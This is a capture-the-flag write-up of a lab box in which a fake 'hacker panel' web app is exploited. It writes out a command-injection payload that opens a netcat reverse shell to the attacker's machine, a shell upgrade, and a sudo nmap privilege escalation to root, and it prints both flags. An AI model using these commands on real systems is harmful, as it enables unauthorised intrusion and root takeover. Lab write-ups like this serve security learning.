

```html
A script kiddie named jeremy just found out about hacking a few days ago! Can you hack him before he tries something dumb?
```

target ip = `192.168.0.106`
## recon 

```bash

## NMAP 

sudo nmap -sCV -p- -oN scan.md 192.168.0.106 
[sudo] password for r1ck: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-09 23:38 GMT
Nmap scan report for 192.168.0.106
Host is up (0.0023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8e:4d:46:ba:2a:04:65:08:e2:85:09:7d:e6:1a:d7:b3 (RSA)
|   256 52:f9:f6:8a:3a:21:05:84:20:01:4f:fd:bd:17:24:44 (ECDSA)
|_  256 db:87:52:e5:d3:ff:2b:92:e8:f2:91:0a:85:63:33:db (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.6 Python/3.8.10
|     Date: Tue, 09 Dec 2025 23:38:59 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 541
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>Jeremy's Hacker Panel</title>
|     <link rel="stylesheet" href="/static/style.css">
|     </head>
|     <body>
|     <nav>
|     href="/">Home</a>
|     href="/scan">Nmap Scan</a>
|     href="/payload">Reverse Shell</a>
|     </nav>
|     <div class="container">
|     <h2>Jeremy's Ultimate Hacker Panel</h2>
|     <p>Only real hackers are allowed in my site</p>
|     <ul>
|     <li><a href="/scan">Run Nmap Scan</a></li>
|     <li><a href="/payload">Generate Reverse Shell</a></li>
|     <p>More coming soon</p>
|     </ul>
|     </div>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.6 Python/3.8.10
|     Date: Tue, 09 Dec 2025 23:39:14 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=12/9%Time=6938B313%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,2CB,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.6\
SF:x20Python/3\.8\.10\r\nDate:\x20Tue,\x2009\x20Dec\x202025\x2023:38:59\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20541\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<hea
SF:d>\n\x20\x20\x20\x20<title>Jeremy's\x20Hacker\x20Panel</title>\n\x20\x2
SF:0\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/style\.css\">\n<
SF:/head>\n<body>\n\n<nav>\n\x20\x20\x20\x20<a\x20href=\"/\">Home</a>\n\x2
SF:0\x20\x20\x20<a\x20href=\"/scan\">Nmap\x20Scan</a>\n\x20\x20\x20\x20<a\
SF:x20href=\"/payload\">Reverse\x20Shell</a>\n</nav>\n\n<div\x20class=\"co
SF:ntainer\">\n\x20\x20\x20\x20\n<h2>Jeremy's\x20Ultimate\x20Hacker\x20Pan
SF:el</h2>\n<p>Only\x20real\x20hackers\x20are\x20allowed\x20in\x20my\x20si
SF:te</p>\n<ul>\n\x20\x20\x20\x20<li><a\x20href=\"/scan\">Run\x20Nmap\x20S
SF:can</a></li>\n\x20\x20\x20\x20<li><a\x20href=\"/payload\">Generate\x20R
SF:everse\x20Shell</a></li>\n\x20\x20\x20\x20<p>More\x20coming\x20soon</p>
SF:\n</ul>\n\n</div>\n\n</body>\n</html>\n")%r(RTSPRequest,1F4,"<!DOCTYPE\
SF:x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<htm
SF:l>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20ht
SF:tp-equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\
SF:x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x
SF:20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\
SF:x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x2
SF:0-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x
SF:20\x20\x20\x20</body>\n</html>\n")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x
SF:20OK\r\nServer:\x20Werkzeug/3\.0\.6\x20Python/3\.8\.10\r\nDate:\x20Tue,
SF:\x2009\x20Dec\x202025\x2023:39:14\x20GMT\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OPTIONS\r\nContent-Leng
SF:th:\x200\r\nConnection:\x20close\r\n\r\n");
MAC Address: 08:00:27:8E:7F:C2 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

two interesting ports ssh on `21` and http on port `5000`which is a panel 
has directories `scan` and `payload`, scan does a nmap scan on a input target, its vulnerable to the classic `command injection`  by sumbmitting `; ls`  lists all the files and directories payload  `; ls -la`

![[cmdj.png]]

cool, get the user.txt `hmv{7609a0e2e5bf272609dd3e12727eed76}` cool sorted 
now let chase that `# root`   dopamine. 

## Exploitation 

payload = `; busybox nc 192.168.0.107 8443 -e /bin/bash` 
to catch a rev shell to our machine, 

```bash 
 nc -lnvp 8443
Listening on 0.0.0.0 8443
Connection received on 192.168.0.106 57002
is
id
uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)
/bin/bash -i
ls
app
changes.txt
hacking-tools
user.txt
wordlists
```

so let's beutify the shell and chase that dopamine.  `python3 -c 'import pty; pty.spawn("/bin/bash")'  and some acient privesc methodoly using gtfo-bin 
```bash 
jeremy@skid:~$ TF=$(mktemp)
TF=$(mktemp)
jeremy@skid:~$ echo 'os.execute("/bin/sh")' > $TF
echo 'os.execute("/bin/sh")' > $TF
jeremy@skid:~$ sudo nmap --script=$TF
sudo nmap --script=$TF
Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-10 01:20 UTC
NSE: Warning: Loading '/tmp/tmp.Py3giytmYZ' -- the recommended file extension is '.nse'.
# 
```

yeah `#` 
But wait 

```bash 
cd /root
root@skid:~# ls
ls
root.txt  snap
root@skid:~# cat root.txt
cat eroot.txt
cat: eroot.txt: No such file or directory
root@skid:~# cat root.txt
cat root.txt
Help I lost the root flag! 
Can you please help me find it? 
root@skid:~# 
```

where is the flag mate??
Ahh i got it grep does 

```bash 
grep -rE 'hmv{' /var 2>/dev/null
grep -rE 'hmv{' /var 2>/dev/null
/var/lib/.cache2/root.txt:hmv{1826b83f95bd2ffc5a665bcd54df7ed5}
```
